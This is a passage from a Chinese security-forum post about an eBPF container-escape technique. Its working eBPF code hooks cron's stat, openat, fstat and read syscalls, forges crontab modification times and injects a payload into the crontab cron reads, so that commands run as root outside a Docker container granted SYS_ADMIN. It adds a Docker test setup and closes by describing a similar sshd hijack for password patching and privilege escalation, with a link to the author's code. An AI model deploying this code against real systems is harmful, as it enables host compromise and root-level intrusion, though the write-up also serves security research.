首先从 `sys_enter` 去 Hook 对应的系统调用。获取当前的 syscall id，从进程 commandline 获取对应的文件名（比较是否为 cron），然后根据我们捕捉到的不同系统调用再分配不同的处理函数。

 

相应的，我们也在对称的位置，即每个 syscall 退出时进行 hook，主要涉及到了对于返回值的修改。

```
// When we enter syscall
SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    // executable is not cron, return
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }
 
    //bpf_printk("cron trigger!\n");
    switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            handle_enter_stat(ctx);
            break;
        case 5:
            handle_enter_fstat(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            //bpf_printk("None of targets , break");
            return 0;
    }
    return 0;
}

```

```
// When we exit syscall
SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  unsigned int id=0;
  struct pt_regs *regs;
  if (cron_pid == 0)
        return 0;
    int pid = bpf_get_current_pid_tgid() & 0xffffffff;
    if (pid != cron_pid)
        return 0;
 
  //bpf_printk("Hit pid: %d\n",pid);
 
  regs = (struct pt_regs *)(ctx->args[0]);
  // Read syscall_id from orig_ax
  id = BPF_CORE_READ(regs,orig_ax);
  switch (id)
    {
        case 0:
            handle_exit_read(ctx);
            break;
        case 4:
            handle_exit_stat();
            break;
        case 5:
            handle_exit_fstat();
            break;
        case 257:
            handle_exit_openat(ctx);
            break;
        default:
            return 0;
    }
 
  return 0;
}

```

**handle_enter_stat(ctx)**

 

stat 进入。

 

首先从 rdi 中读出文件名到缓冲区，然后确保文件名是 `/etc/crontab` 或者 `crontabs`

 

接下来拿到当前的 pid、文件名，存在全局变量中。

 

然后很关键的一步是通过 rsi 获取对应的 statbuf 结构（struct stat）的地址，也放入全局变量。

```
/*
 
https://lore.kernel.org/bpf/20200313172336.1879637-4-andriin@fb.com/
https://github.com/time-river/Linux-eBPF-Learning/tree/main/4-CO-RE
https://vvl.me/2021/02/eBPF-2-example-openat2/
 
*/
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx){
  struct pt_regs *regs;
    char buf[0x40];
    char *pathname ;
 
    regs = (struct pt_regs *)(ctx->args[0]);
 
  // Read the correspoding string which ends at NULL
  pathname = (char *)PT_REGS_PARM1_CORE(regs);
  bpf_probe_read_str(buf,sizeof(buf),pathname);
   // Check if the file is "/etc/crontab" or "crontabs"
  if(memcmp(buf , CRONTAB , sizeof(CRONTAB)) && memcmp(buf,SPOOL_DIR,sizeof(SPOOL_DIR))){
        return 0;
  }
  if(cron_pid == 0){
        cron_pid = bpf_get_current_pid_tgid() & 0xffffffff;
    //bpf_printk("New cron_pid: %d\n",cron_pid);
    }
 
  memcpy(filename_saved , buf , 64);
  bpf_printk("[sys_enter::handle_enter_stat()] New filename_saved: %s\n",filename_saved);
 
  //bpf_printk("%lx\n",PT_REGS_PARM2(regs));
  // Read the file's state address, saved into statbuf_ptr from regs->rsi
  statbuf_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);
  //bpf_probe_read_kernel(&statbuf_ptr , sizeof(statbuf_ptr) , PT_REGS_PARM2(regs));
 
  return 0;
}

```

这里主要是要 Capture 到对应的 cron 进程中对两个文件名判断的地方。

 

**handle_exit_stat()**

 

stat 退出。

 

我们此时的目标是 bypass 后面的两个 TEQUAL，让 cron 检测到文件的更新，然后立刻去调用 `process_crontab("root", NULL, SYSCRONTAB, &syscron_stat,&new_db, old_db)`

```
static __inline int handle_exit_stat(){
  if(statbuf_ptr == 0){
    return 0;
  }
 
  bpf_printk("[sys_exit::handle_exit_stat()] cron %d stat() %s\n",cron_pid , filename_saved);
 
 
  /*
 
  At this point, we need to make sure that the following two conditions are both passed.
  Which is equivalent to :
 
  !TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))    [1]
  !TEQUAL(syscron_stat.st_mtim, ts_zero)                                [2]
 
  */
 
 // We are tend to set statbuf.st_mtim ZERO and set syscron_stat.st_mtim a SMALL RANDOM VALUE
  __kernel_ulong_t spool_dir_st_mtime = 0;
  __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;  //bpf_get_prandom_u32 Returns a pseudo-random u32.
 
  // Ensure the file is our target
 
  // If we are checking SPOOL_DIR
  if(!memcmp(filename_saved , SPOOL_DIR , sizeof(SPOOL_DIR))){
    bpf_probe_write_user(&statbuf_ptr->st_mtime , &spool_dir_st_mtime , sizeof(spool_dir_st_mtime) );
  }
 
  if(!memcmp(filename_saved , CRONTAB , sizeof(CRONTAB))){
    bpf_probe_write_user(&statbuf_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));
  }
 
  bpf_printk("[sys_exit::handle_exit_stat()]  Modify DONE\n");
  // update
  statbuf_ptr = 0;
 
  return 0;
}

```

**open**

 

open -> open64 -> openat

 

所以我们最终要对 openat 进行 hook。

```
int openat(int dirfd, const char *pathname, int flags);
int openat(int dirfd, const char *pathname, int flags, mode_t mode);

```

在 enter 时我们要保存 + 判断 rsi 中的参数。在退出时，保存 open_fd。

```
// int openat(int  dirfd , const char * pathname
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx) {
  struct pt_regs *regs;
    char buf[0x40];
    char *pathname ;
 
    regs = (struct pt_regs *)(ctx->args[0]);
  pathname = (char *)PT_REGS_PARM2_CORE(regs);
  bpf_probe_read_str(buf,sizeof(buf),pathname);
 
   // Check if open SYSCRONTAB
  if(memcmp(buf , SYSCRONTAB , sizeof(SYSCRONTAB))){
        return 0;
  }
  bpf_printk("[sys_enter::handle_enter_openat] We Got it: %s\n",buf);
 
  // Save to openat_filename_saved
  memcpy(openat_filename_saved , buf , 64);
  return 0;
}

```

```
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx){
   if(openat_filename_saved[0]==0){
    return 0;
  }
  // Ensure we open SYSCROnTAB
  if(!memcmp(openat_filename_saved , SYSCRONTAB , sizeof(SYSCRONTAB)))
  {
    // save the corresponding file descriptor
    open_fd = ctx->args[1];
    bpf_printk("[sys_exit::handle_exit_openat()] openat: %s, fd: %d\n",openat_filename_saved , open_fd);
    openat_filename_saved[0] = '\0';
  }
  return 0;
}

```

ok，现在我们已经有了对应的 fd 了。

 

**fstat**

```
int fstat(int fd, struct stat *statbuf);

```

```
// int fstat(int fd, struct stat *statbuf);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx){
 
 
  struct pt_regs *regs;
    char buf[0x40];
    char *pathname ;
  int fd=0;
 
    regs = (struct pt_regs *)(ctx->args[0]);
  fd = PT_REGS_PARM1_CORE(regs);
  if(fd != open_fd){
    return 0;
  }
 
  bpf_printk("[sys_enter::handle_enter_fstat] We Got fd: %d\n",fd);
  statbuf_fstat_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);
  return 0;
}

```

```
static __inline int handle_exit_fstat(){
 
  if(open_fd == 0){
    return 0;
  }
  if(statbuf_fstat_ptr == 0){
    return 0;
  }
 
  __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;
 
  // bpf_printk("[sys_exit::handle_exit_fstat]: HIT!\n");
 
 
  bpf_probe_write_user(&statbuf_fstat_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));
 
  bpf_printk("[sys_exit::handle_exit_fstat()]  Modify DONE\n");
 
 
  //open_fd = 0;
 
  return 0;
}

```

**read**

```
// read(int fd, void *buf, size_t count);
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
  int pid=0;
  pid = bpf_get_current_pid_tgid() & 0xffffffff;
  if(pid!=cron_pid){
    return 0;
  }
  struct pt_regs *regs;
    char buf[0x40];
    char *pathname ;
  int fd=0;
  regs = (struct pt_regs *)(ctx->args[0]);
  fd = PT_REGS_PARM1_CORE(regs);
  read_buf_ptr = (void *)PT_REGS_PARM2_CORE(regs);
  if(fd != open_fd){
    jump_flag = MISS;
    return 0;
  }
  jump_flag = HIT;
 
 
  bpf_printk("[sys_enter::handle_enter_read] fd is %d\n",fd);
  bpf_printk("[sys_enter::handle_enter_read] read_buf is : 0x%lx\n",read_buf_ptr);
  return 0;
}

```

```
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx){
  if(jump_flag == MISS){
    return 0;
  }
  int pid=0;
  pid = bpf_get_current_pid_tgid() & 0xffffffff;
  if(pid!=cron_pid){
    return 0;
  }
 
  if(read_buf_ptr == 0){
    return 0;
  }
  ssize_t ret = ctx->args[1];
  if (ret <= 0)
    {
        read_buf_ptr  = 0;
        bpf_printk("[sys_exut::handle_exit_read] read failed!\n");
        return 0;
    }
  bpf_printk("[sys_exut::handle_exit_read] your read length: 0x%lx\n",ret);
  if (ret < sizeof(PAYLOAD))
    {
        bpf_printk("PAYLOAD too long\n");
 
        read_buf_ptr = 0;
        return 0;
    }
 
  bpf_printk("[sys_exut::handle_exit_read] target write addr: 0x%lx\n",read_buf_ptr);
 
  //bpf_printk("%s\n",(char *)(read_buf_ptr+0x2bb));
  bpf_probe_write_user((char *)(read_buf_ptr), PAYLOAD, sizeof(PAYLOAD));
  bpf_printk("[sys_exut::handle_exit_read] sizeof PAYLOAD(%d) ; HIJACK DONE!\n",sizeof(PAYLOAD));
  read_buf_ptr = 0;
  jump_flag = MISS;
  return 0;
}

```

##### 在 Docker 中测试

**首先构建相应的环境**

```
FROM ubuntu:20.04   
ARG DEBIAN_FRONTEND=noninteractive   
 
# 接下来使用sed -i进行文本的全局字符串替换来做换源操作
RUN \
 sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.163.com/g" /etc/apt/sources.list && \
 sed -i "s/http:\/\/security.ubuntu.com/http:\/\/mirrors.163.com/g" /etc/apt/sources.list && \
 apt-get update && \
 apt-get -y dist-upgrade && \
 apt-get install -y lib32z1 ssh cpio libelf-dev
RUN useradd -m ctf
 
CMD ["/bin/sh"]   
 
EXPOSE 9999

```

```
docker build -t .
 
docker run -ti --cap-add SYS_ADMIN -- /bin/sh # 注意这里要给admin
 
docker cp ./hello :/ 
```

在 docker 里直接运行对应文件即可。

 

然可以从 cron 的 log 进行观测：

```
journalctl -f -u cron

```

最终在 docker 外执行了命令。

#### 通过 eBPF 劫持 sshd 进程

在这篇文章之后，其实很容易想到，既然可以通过 eBPF 来对其他的进程的系统调用进行劫持，那有没有可能做一些其他的事情，比如尝试针对一些除了 crond 以外的其他的**用户态高权限进程**做一些事情，其实一个比较容易想到的就是 sshd 进程。

 

而事实上，通过 eBPF 确实可以实针对 sshd 的劫持。实现原理类似于上面的 crontab hook，最终达到的效果包括但不仅限于：

1.  patch 掉原有用户的密码。
2.  修改掉一个低权限用户为一个高权限登录的用户。
3.  用一个不存在的用户直接登录。

然而作为一个 pwn 手 / 二进制选手，其实我不太清楚这个到底有什么作用，但是他确实是可以做到这样一个效果。。。我的实现代码可以在：https://github.com/OrangeGzY/Eebpf-kit/blob/main/libbpf-bootstrap/examples/c/esshd.bpf.c 中找到。

[【公告】欢迎大家踊跃尝试高研班 11 月试题，挑战自己的极限！](https://bbs.pediy.com/thread-270220.htm)

最后于 16 分钟前 被 ScUpax0s 编辑 ，原因：

[#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm)